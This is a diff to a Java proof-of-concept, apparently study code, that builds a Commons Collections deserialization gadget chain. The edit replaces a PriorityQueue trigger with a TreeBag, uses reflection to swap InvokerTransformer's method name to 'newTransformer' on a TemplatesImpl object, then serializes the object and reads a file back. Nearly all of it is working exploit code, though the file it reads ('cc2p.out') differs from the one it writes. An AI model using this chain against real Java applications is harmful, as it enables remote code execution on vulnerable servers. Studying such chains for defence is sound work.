@@ -1,17 +1,17 @@
 import javassist.ClassPool;
 import javassist.CtClass;
+import org.apache.commons.collections4.bag.TreeBag;
 import org.apache.commons.collections4.comparators.TransformingComparator;
 import org.apache.commons.collections4.functors.InvokerTransformer;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 import java.lang.reflect.Field;
-import java.util.PriorityQueue;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 
-public class CommomsCollections2 {
+public class CommonsCollections2T {
     public static void main(String[] args) throws Exception {
         String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
         String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
@@ -33,29 +33,21 @@ public class CommomsCollections2 {
         field1.setAccessible(true);//暴力反射
         field1.set(templatesImpl,"test");//将templatesImpl上的_name字段设置为test
 
-        InvokerTransformer transformer=new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});
+        InvokerTransformer transformer=new InvokerTransformer("toString",new Class[]{},new Object[]{});
         TransformingComparator comparator =new TransformingComparator(transformer);//使用TransformingComparator修饰器传入transformer对象
-        PriorityQueue queue = new PriorityQueue(2);//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。
-        queue.add(1);//添加数字1插入此优先级队列
-        queue.add(2);//添加数字1插入此优先级队列
 
-        /*Field field4=queue.getClass().getDeclaredField("size");//获取PriorityQueue的comparator字段
-        field4.setAccessible(true);//暴力反射
-        field4.set(queue,2);//设置queue的comparator字段值为comparator*/
+        TreeBag tb = new TreeBag(comparator);
+        tb.add(templatesImpl);
 
-        Field field2=queue.getClass().getDeclaredField("comparator");//获取PriorityQueue的comparator字段
-        field2.setAccessible(true);//暴力反射
-        field2.set(queue,comparator);//设置queue的comparator字段值为comparator
+        Field field2 = InvokerTransformer.class.getDeclaredField("iMethodName");
+        field2.setAccessible(true);
+        field2.set(transformer, "newTransformer");
 
-        Field field3=queue.getClass().getDeclaredField("queue");//获取queue的queue字段
-        field3.setAccessible(true);//暴力反射
-        field3.set(queue,new Object[]{templatesImpl,templatesImpl});//设置queue的queue字段内容Object数组，内容为templatesImpl
-
-        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("test.out"));
-        outputStream.writeObject(queue);
+        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("cc2t.out"));
+        outputStream.writeObject(tb);
         outputStream.close();
 
-        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("test.out"));
+        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("cc2p.out"));
         inputStream.readObject();
     }
 }
